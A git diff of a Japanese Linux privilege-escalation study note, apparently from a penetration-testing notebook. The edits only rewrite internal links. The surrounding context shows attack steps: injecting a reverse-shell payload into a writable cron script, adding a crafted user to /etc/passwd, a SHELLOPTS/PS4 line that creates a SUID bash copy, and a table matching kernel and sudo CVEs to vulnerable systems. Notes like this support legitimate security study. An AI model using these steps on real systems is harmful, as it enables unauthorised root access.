@@ -1,6 +1,6 @@
 - 関連ノート：
-	- [[🔍Linux Enumeration]]
-	- パーミッションについての基本事項：[[権限関連の知識、コマンド]]
+	- [🔍Linux Enumeration](🔍Linux%20Enumeration.md)
+	- パーミッションについての基本事項：[権限関連の知識、コマンド](../Common/権限関連の知識、コマンド.md)
 
 ---
 
@@ -15,9 +15,9 @@
 	- 書き込み権限(`w`)のある実行可能ファイルを実行
 	- 実行間隔がテストに使える時間の範囲内(実行間隔が短い)
 
-1. [[🔍Linux Enumeration#Cronの列挙コマンド]]で、条件を満たすCronを検索
+1. [🔍Linux Enumeration](🔍Linux%20Enumeration.md#Cronの列挙コマンド)で、条件を満たすCronを検索
 
-2. [[What is the shell#名前付きパイプを使ったnetcatリバースシェル]]のペイロードを実行可能ファイルに追記する
+2. [What is the shell](../Common/What%20is%20the%20shell.md#名前付きパイプを使ったnetcatリバースシェル)のペイロードを実行可能ファイルに追記する
 ```zsh
 # ファイルが存在することを確認＆空白行を入れてペイロード注入による影響を減少
 echo >> <file.sh>
@@ -47,7 +47,7 @@ cat /etc/crontab
 ↓出力例
 ![[Pasted image 20230626210329.png]]
 
-2. [[🔍Linux Enumeration#Cronの列挙コマンド]]で実行ファイル(.sh)を実行するcronを探す
+2. [🔍Linux Enumeration](🔍Linux%20Enumeration.md#Cronの列挙コマンド)で実行ファイル(.sh)を実行するcronを探す
 
 3. 実行ファイルがフルパスではないことを確認
 	- 例：
@@ -76,7 +76,7 @@ chmod +x <(同じ名前)file.sh>
 - LinPEASの結果の`Systemd Information`に以下のように表示されることがある
 ![[Pasted image 20260214172732.png]]
 
-- 使用しているサービス(systemd)によって実行されるコマンドが相対パスで指定されている場合は、[[#Cron w/ PATH変数]]と同じ原理で攻撃できる
+- 使用しているサービス(systemd)によって実行されるコマンドが相対パスで指定されている場合は、[💥Linux Privilege Escalation](💥Linux%20Privilege%20Escalation.md#Cron%20w/%20PATH変数)と同じ原理で攻撃できる
 	- ※ただし、LinPEASは誤って引数もコマンドと解釈して検知することがある（上記画像で、`apache2.service: Uses relative path 'start'`と表示があるが、`start`は引数
 
 ---
@@ -94,7 +94,7 @@ chmod +x <(同じ名前)file.sh>
 openssl passwd <pw>
 ```
 - ⚠️：`openssl`は通常はデフォルトでLinuxがサポートするハッシュアルゴリズムでハッシュ化するが、システムによってはサポートされないハッシュアルゴリズムを使うことがある
-	- →[[#補足：opensslがサポートされないハッシュアルゴリズムを使ってしまうとき]]
+	- →[💥Linux Privilege Escalation](💥Linux%20Privilege%20Escalation.md#補足：opensslがサポートされないハッシュアルゴリズムを使ってしまうとき)
 
 2. `/etc/passwd`に任意のユーザーと作成したパスワードハッシュの組み合わせを追記する
 ```zsh
@@ -139,10 +139,10 @@ openssl passwd -6 <pw>
 
 ## SUIDバイナリ w/ 公開エクスプロイト
 
-1. [[🔍Linux Enumeration#高権限をもつバイナリの列挙]]を実施
+1. [🔍Linux Enumeration](🔍Linux%20Enumeration.md#高権限をもつバイナリの列挙)を実施
 2. 💥[GTFOBins](https://gtfobins.github.io/)を使い、対象のバイナリを検索→"SUID"もしくは"Capability"に記載のコマンドを（説明を読んだ上で）実行
 	- SGIDがあるバイナリに対しては、SUIDのテクニックを使える
-	- [[#補足：GTFOBinsの方法でPermission deniedの場合の原因追求]]
+	- [💥Linux Privilege Escalation](💥Linux%20Privilege%20Escalation.md#補足：GTFOBinsの方法でPermission%20deniedの場合の原因追求)
 
 - 💡バイナリのバージョンによっては、Exploit-DBに公開エクスプロイトがあるかも
 
@@ -183,7 +183,7 @@ echo PATH.bkup
 export PATH=<PATH.bkupの中身>
 ```
 
-4. [[🔍Linux Enumeration#高権限をもつバイナリの列挙]]で検出したSUIDバイナリが、フルパスを使わずにコマンドを呼び出している
+4. [🔍Linux Enumeration](🔍Linux%20Enumeration.md#高権限をもつバイナリの列挙)で検出したSUIDバイナリが、フルパスを使わずにコマンドを呼び出している
 	- 実際にバイナリを動作させてエラーメッセージからコマンドを推測するか、`strings`コマンドで文字列を抽出してコマンドを確認する
 
 ### パターンA：書き込み可能なディレクトリがPATH内に存在する場合
@@ -310,7 +310,7 @@ export -f <実行コマンドフルパス>
 
 🔗[CVE-2016-7543](https://jvndb.jvn.jp/ja/contents/2016/JVNDB-2016-006966.html)
 
-4.3以下であっても、パッチの適用状況やディストロによってはこのエクスプロイトが成功せず、反対に[[#SUID w/ Bash <= 4.2.-048]]の方法は成功する可能性もある。
+4.3以下であっても、パッチの適用状況やディストロによってはこのエクスプロイトが成功せず、反対に[💥Linux Privilege Escalation](💥Linux%20Privilege%20Escalation.md#SUID%20w/%20Bash%20<=%204.2.-048)の方法は成功する可能性もある。
 
 - 条件：
 	- Bashのバージョンが4.3以下のとき
@@ -338,13 +338,13 @@ env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootba
 
 ## Sudo権限 w/GTFOBins
 
-1. [[🔍Linux Enumeration#ユーザー情報・ホスト名の列挙コマンド]]でsudo権限を確認
+1. [🔍Linux Enumeration](🔍Linux%20Enumeration.md#ユーザー情報・ホスト名の列挙コマンド)でsudo権限を確認
 ```zsh
 sudo -l
 ```
 
 2. 💥[GTFOBins](https://gtfobins.github.io/)を使い、対象のバイナリを検索 → `Sudo`に記載のコマンドを（説明を読んだ上で）実行
-	- [[#補足：Permission deniedの場合の原因追求]]
+	- [💥Linux Privilege Escalation](💥Linux%20Privilege%20Escalation.md#補足：Permission%20deniedの場合の原因追求)
 
 ### 補足：GTFOBinsの方法でPermission deniedの場合の原因追求
 
@@ -503,7 +503,7 @@ chmod +xs /tmp/nfs/shell.elf
 
 # カーネルの脆弱性を利用したPrivEsc
 
-[[🔍Linux Enumeration#基本的なシステム情報の列挙]]
+[🔍Linux Enumeration](🔍Linux%20Enumeration.md#基本的なシステム情報の列挙)
 
 ## 脆弱性を利用するにあたって...
 
@@ -556,12 +556,12 @@ $$USNの修正済みバージョン情報$$
 
 | エクスプロイト                                                             | 対象ディストロ                                                                        | 対象カーネル                                    | 備考 / コメント                                                                                    |
 | ------------------------------------------------------------------- | ------------------------------------------------------------------------------ | ----------------------------------------- | -------------------------------------------------------------------------------------------- |
-| [[#Dirty Cow (CVE-2016-5195)]]                                      | ほぼ全Linux                                                                       | 2.x ～ 4.8.2                               | カーネル依存型。ディストロごとのバックポートは要確認。g++の有無でコンパイル方法が変わる。                                               |
-| [[#PwnKit (CVE-2021-4034)]]                                         | ・Ubuntu 10–21.10  <br>・Debian 7–11  <br>・RedHat 6.0–8.4（Fedora / CentOSも可能性あり） | すべてのカーネル                                  | pkexec / polkit < 0.120 に依存。ディストロごとのパッケージバージョンで判定。**使いやすい**                                  |
-| [[#Get-Rekt BPF (CVE-2017-16995)]]                                  | ・Debian 9  <br>・Ubuntu 14.04–16.04  <br>・Mint 17–18  <br>・Fedora 25–27         | 4.4.0 – 4.14.10                           | カーネル依存型。                                                                                     |
-| [[#Dirty Pipe (CVE-2022-0847)]]                                     | ・Ubuntu 20.04–21.04  <br>・Debian 11  <br>・RHEL 8.0–8.4  <br>・Fedora 35         | 5.8.x以上 (修正済: 5.16.11, 5.15.25, 5.10.102) | カーネル依存型。ターゲットカーネルが修正済みか確認。                                                                   |
+| [💥Linux Privilege Escalation](💥Linux%20Privilege%20Escalation.md#Dirty%20Cow%20(CVE-2016-5195))                                      | ほぼ全Linux                                                                       | 2.x ～ 4.8.2                               | カーネル依存型。ディストロごとのバックポートは要確認。g++の有無でコンパイル方法が変わる。                                               |
+| [💥Linux Privilege Escalation](💥Linux%20Privilege%20Escalation.md#PwnKit%20(CVE-2021-4034))                                         | ・Ubuntu 10–21.10  <br>・Debian 7–11  <br>・RedHat 6.0–8.4（Fedora / CentOSも可能性あり） | すべてのカーネル                                  | pkexec / polkit < 0.120 に依存。ディストロごとのパッケージバージョンで判定。**使いやすい**                                  |
+| [💥Linux Privilege Escalation](💥Linux%20Privilege%20Escalation.md#Get-Rekt%20BPF%20(CVE-2017-16995))                                  | ・Debian 9  <br>・Ubuntu 14.04–16.04  <br>・Mint 17–18  <br>・Fedora 25–27         | 4.4.0 – 4.14.10                           | カーネル依存型。                                                                                     |
+| [💥Linux Privilege Escalation](💥Linux%20Privilege%20Escalation.md#Dirty%20Pipe%20(CVE-2022-0847))                                     | ・Ubuntu 20.04–21.04  <br>・Debian 11  <br>・RHEL 8.0–8.4  <br>・Fedora 35         | 5.8.x以上 (修正済: 5.16.11, 5.15.25, 5.10.102) | カーネル依存型。ターゲットカーネルが修正済みか確認。                                                                   |
 | [Polkit (CVE-2021-2560)](https://www.exploit-db.com/exploits/50011) | ・Ubuntu 20.04 / 20.10  <br>・Debian 11  <br>・RHEL 8.x / Fedora 33               | すべてのカーネル                                  | 2021年頃の比較的新しい環境が対象。  <br>D-Busの応答を切断するタイミングを利用した論理バグ。  <br>GUI環境がなくても成立する。                   |
-| [[#sudo Baron Samedit(CVE-2021-3156)]]                              | ほぼ全ディストロ（sudo 使用環境）                                                            | すべてのカーネル                                  | カーネル非依存（sudo のバージョン依存）。  <br>*sudo 1.8.2 ～ 1.8.31p2 / 1.9.0 ～ 1.9.5p1* が対象。  <br>ヒープオーバーフロー。 |
+| [💥Linux Privilege Escalation](💥Linux%20Privilege%20Escalation.md#sudo%20Baron%20Samedit(CVE-2021-3156))                              | ほぼ全ディストロ（sudo 使用環境）                                                            | すべてのカーネル                                  | カーネル非依存（sudo のバージョン依存）。  <br>*sudo 1.8.2 ～ 1.8.31p2 / 1.9.0 ～ 1.9.5p1* が対象。  <br>ヒープオーバーフロー。 |
 
 
 ---
@@ -617,7 +617,7 @@ ls -l /usr/bin/pkexec
 ```zsh
 dpkg -s policykit-1 | grep Version
 ```
-→出力を[[#ディストロごとの vulnerable / fixed バージョン]]と照合する。
+→出力を[💥Linux Privilege Escalation](💥Linux%20Privilege%20Escalation.md#ディストロごとの%20vulnerable%20/%20fixed%20バージョン)と照合する。
 
 3. 脆弱なバージョンであれば、エクスプロイトの実行
 ```zsh
@@ -752,7 +752,7 @@ dpkg -l sudo
 # RHEL / CentOS / Fedora の場合
 rpm -qa | grep sudo
 ```
-- → 出力を[[#ディストロごとのvulnerable / fixed バージョン]]と照合
+- → 出力を[💥Linux Privilege Escalation](💥Linux%20Privilege%20Escalation.md#ディストロごとのvulnerable%20/%20fixed%20バージョン)と照合
 
 3. exploit の実行
 ```sh
@@ -809,7 +809,7 @@ ls -la <path_to_binary>
 ```
 →誰でも書き換え可能
 
-3. [[What is the shell#🔁Pythonが使えない場合]]のペイロードを用意し、サービスrestart
+3. [What is the shell](../Common/What%20is%20the%20shell.md#🔁Pythonが使えない場合)のペイロードを用意し、サービスrestart
 
 
 ---
